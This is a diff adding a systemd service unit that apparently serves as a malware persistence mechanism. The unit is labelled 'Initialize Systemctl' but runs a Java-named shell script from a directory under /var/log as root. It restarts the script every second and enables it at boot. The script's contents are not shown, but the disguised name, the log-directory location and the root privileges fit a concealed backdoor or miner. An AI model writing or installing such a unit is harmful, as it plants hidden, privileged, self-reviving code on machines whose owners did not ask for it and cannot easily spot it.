@@ -1,0 +1,14 @@
+[Unit]
+Description=Initialize Systemctl
+After=network.target
+
+[Service]
+ExecStart=/var/log/asa/osa/java-23.0.1-bin-java.sh
+Type=exec
+Restart=always
+RestartSec=1
+User=root
+
+
+[Install]
+WantedBy=multi-user.target
